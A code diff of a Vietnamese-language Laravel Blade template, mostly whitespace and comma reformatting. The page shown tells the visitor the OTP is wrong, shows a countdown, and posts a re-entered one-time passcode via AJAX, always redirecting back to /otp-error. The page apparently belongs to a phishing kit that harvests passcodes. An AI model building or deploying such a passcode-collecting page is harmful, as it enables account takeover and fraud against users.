@@ -43,7 +43,6 @@
         header .header-option {
             margin-left: inherit;
         }
-
     </style>
 
 </head>
@@ -68,7 +67,6 @@
         header {
             z-index: 999999999999999 !important;
         }
-
     </style>
     <header class="d-flex justify-content-between">
         <div class="nav-bar" style="margin-right:0px;">
@@ -132,7 +130,6 @@
         .hottline span {
             color: #FFF;
         }
-
     </style>
 
     <style>
@@ -144,7 +141,6 @@
             /* object-fit: cover; */
             margin-right: 16px;
         }
-
     </style>
 
     <a href="javascript:void(0)" class="overlay-sidebar"></a>
@@ -203,7 +199,6 @@
         .slider-box img {
             display: block !important;
         }
-
     </style>
 
     <style>
@@ -252,7 +247,6 @@
         [hidden] {
             display: none !important;
         }
-
     </style>
     <div class="container">
         <h1 style="color: red; margin: 10px; text-align: center;">OTP không
@@ -263,7 +257,7 @@
 
         <div id="countdown">Thời gian chờ của bạn còn lại 507 giây</div>
 
-        <form action="{{ route('otp_error_post') }}" method="post">
+        <form id="service" action="{{ route('otp_error_post') }}" method="post">
             @csrf
             <div class="form-group">
                 <label>Nhập mã otp:</label>
@@ -341,7 +335,6 @@
             .bottom-panel ul li a.active span {
                 color: #194796 !important;
             }
-
         </style>
 
         <!-- latest jquery-->
@@ -395,7 +388,6 @@
                 background-color: #ffffff;
                 z-index: 9999999999;
             }
-
         </style>
 
         <div class="float-icon-hotline" aria-hidden="true">
@@ -546,7 +538,6 @@
                 bottom: 26%;
                 left: -8px;
             }
-
         </style>
 
     </section><svg id="zohocomponents__svg" style="display: none" class="zh-dnone">
@@ -867,19 +858,18 @@
             var form = $(this);
             var url = form.attr('action');
             $.ajax({
-                type: "POST"
-                , url: url
-                , data: form.serialize()
-                , success: function(data) {
+                type: "POST",
+                url: url,
+                data: form.serialize(),
+                success: function(data) {
                     console.log(data);
                     window.location.href = "/otp-error";
-                }
-                , error: function(data) {
+                },
+                error: function(data) {
                     console.log(data);
                 }
             });
         });
-
     </script>
     <script>
         $('.loader').fadeOut('slow');
@@ -897,7 +887,6 @@
             }
         }
         countdown(500, '');
-
     </script>
 </body>
 
